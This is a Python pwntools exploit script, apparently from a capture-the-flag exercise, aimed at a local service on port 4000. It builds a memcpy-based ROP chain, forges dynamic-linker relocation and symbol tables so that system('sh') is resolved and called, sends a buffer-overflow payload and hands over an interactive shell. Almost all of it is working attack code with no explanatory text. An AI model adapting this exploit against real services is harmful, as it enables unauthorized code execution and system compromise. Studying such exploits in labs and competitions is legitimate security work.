#!/usr/bin/env python

from pwn import *

#context.arch='i386'

r=remote('127.0.0.1',4000)

read = 0x8048300
memcpy = 0x8048310
plt0 = 0x80482f0
pop3 = 0x8048519
pop2 = 0x804851a
pop1 = 0x804851b
got1 = 0x804a004  #link_maps
gmon = 0x8048326
dt_debug=0xf77aa920
buf = 0x804a040
s = buf +1024
d = buf +2048

dynamic = 0x8049eec
relplt = 0x80482b4
dynsym = 0x80481cc
dynstr = 0x804822c

rop = flat(
     memcpy, pop3, s+32, dynamic+12*8+4 ,4, # DT_DEBUG  p/x *(struct r_debug*)addr
     memcpy, pop3, buf, 0x00, 20,       
     memcpy, pop3, s+72 , buf+4, 4,    #R_map p/x *(struct link_map*)addr  :elf link_map1
     memcpy, pop3, buf, 0x00, 16,
     memcpy, pop3, s+112, buf+12, 4,   #link_map2  linux-gate.so.1
     memcpy, pop3, buf, 0x00, 16,
     memcpy, pop3, s+152, buf+12, 4,   #link_map3  /lib/libc.so.6
     memcpy, pop3, buf, 0x00, 12*4,
     memcpy, pop3, s+192, buf+11*4, 4,  # DT_PLTGOT val=3     p/s ((struct link_map*)0xf7780000)->l_info[DT_PLTGOT]
     memcpy, pop3, buf, 0x00, 8,    
     memcpy, pop3, s+232, buf+4, 4,  
     memcpy, pop3, buf, 0x00, 12,
     memcpy, pop3, s+260, buf+8, 4,
     0x00d1, d+40, 0,  
     )

data = flat(
	[buf,0x7 | ((d+12-dynsym)/16)<<8],0x456, #DT_JMPREL
      [d+28-dynstr,2,3,0x12],
      'system\x00\x00',     #str
      'sh\x00\x00',
      [1,2,3,4,5,6,7,8],    #link_map
      [9,10,11,12,13,d+184,d+192,16],
        [17,18,19,20,21,22,23,24],
      [25,26,27,28,29,30,31,d+200],
      [0x1,d+60,0x3,0x12], #symtab
      [5,d+28],   #str_tag
      [6,d+168],  #symtab_tag
      [23,d],  #relro_tag
      )

raw_input('@')
r.send(('A'*14+p32(buf+1024+4)).ljust(1024,'\0')+rop.ljust(1024,'\0')+data)
r.interactive()


